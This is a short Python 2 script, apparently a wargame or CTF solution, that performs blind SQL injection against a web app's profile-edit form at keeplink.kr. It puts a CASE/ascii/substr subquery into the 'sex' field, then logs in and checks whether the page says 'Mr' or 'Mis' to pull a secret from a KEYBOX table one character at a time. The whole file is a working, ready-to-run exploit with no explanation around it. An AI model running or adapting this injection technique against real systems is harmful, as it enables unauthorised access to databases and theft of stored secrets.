#-*- coding:utf-8 -*-
import requests as req
import sys

EDIT_URL = "http://keeplink.kr:10105/web_basic_edit_ok.php"
ID = "testid"
PW = "testpw"
AGE = "8"
EMAIL = "testemali"

def doCheckInjectionResult(): # 결과를 확인
    LOGIN_URL = "http://keeplink.kr:10105/web_basic_ok.php"
    data_q = {'id':ID, 'pw':PW}
    res = req.post(LOGIN_URL, data=data_q)
    if 'Mr' in res.text:
 #       print res.text
        #raw_input('continue?')
        return True
    elif 'Mis' in res.text:
#        print res.text
        return False


def doBlindSqli(idx):   # 성별부분 blind sqli
    before = ''
    for i in range(32, 127, 1):  # printable ascii range
        sex = "(select case ascii(substr((select k3y from KEYBOX),{},1)) when {} then 1 else 2 end)".format(idx, i)  # if true, we are Mr.
        
 #       print '== request =='
#        print "id={}&pw={}&pwch={}&age={}&sex={}&email={}".format(ID,PW,PW,AGE,sex,EMAIL)
         
#        raw_input('sned?')

        data_q = {"id":ID, "pw":PW, "pwch":PW, "age":AGE, "sex":sex, "email":EMAIL}
        
        res = req.post(EDIT_URL, data=data_q)
        if doCheckInjectionResult() == True:    # check result
            print chr(i),
            before = chr(i)
            break
                
    if before == '':
        print '[wrong] key not found..'
        sys.exit(1)
    

def main():
    for i in range(1, 20, 1):   # guess key length is under 10
        idx = str(i)
        doBlindSqli(idx)

    return

if __name__ == "__main__":
    main()


